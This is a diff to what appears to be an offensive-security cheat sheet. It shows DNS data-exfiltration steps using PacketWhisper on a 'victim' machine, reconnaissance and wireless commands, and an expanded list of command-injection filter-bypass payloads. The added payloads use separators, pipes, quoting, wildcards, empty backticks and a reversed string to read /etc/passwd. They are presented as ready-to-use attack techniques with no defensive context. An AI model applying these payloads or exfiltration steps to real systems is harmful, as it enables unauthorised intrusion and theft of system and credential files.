@@ -328,7 +328,7 @@ proxychains godork -q "inurl:search.php=" -p 50 | tee results.txt
 gobuster dir -url https://website.com/ | anew dirs && dirb https://website.com | anew dirs
 ```
 ### Using packetwhisper to exfil data using DNS
-1. mkdir tmpwork && cd tmpwork && wget  [https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip](https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip)
+1. ```mkdir tmpwork && cd tmpwork && wget  [https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip](https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip)```
 2. Start python simple http server
 3. Goto victims machine & open outbound port
 4. Generate powershell cmd & start wireshark on attacker machine
@@ -390,9 +390,17 @@ airodump-ng --channel 1,2,3,4 / --essid AP_NAME
 airodump-ng --band abg wlan0 / --essid AP_NAME / --bssid MAC_ADDRESS_OF_ORIGINAL_DEVICE
 ```
 ### Command Injection filter bypass - reflected
-1. ; pwd
-2. && cat /etc/passwd
-3. | cat /etc/passwd
+1. Using command seperate: ```; pwd```
+2. Using command append: ```&& cat /etc/passwd```
+3. Using pipe: ```| cat /etc/passwd```
+4. Using quoted command - add quotes for any character in word (EX:```cat/et"c"/p"a"ssw"d"```)
+5. Using wildcards - replace any word with "```*```" & "```?```" (EX:```cat /etc/pa*wd``` or ```cat /etc/p?sswd```)
+6. Using null vars - add ``` `` ``` in between words (EX:```cat /e``tc/p``asswd```)
+7. Multi bypass - reverse encoded + multi bypass filters - (EX:``` |cat /"e"t``c/p?sswd ```)
+7. Lethal injection - (EX:```"dws?ap/c``t"e"/ tac" | rev```)
+
+```"dws?ap/c``t"e"/ tac" | rev```
+
 ### Command Injection filter bypass - blind
 1. Test reflection
 On victim asset:
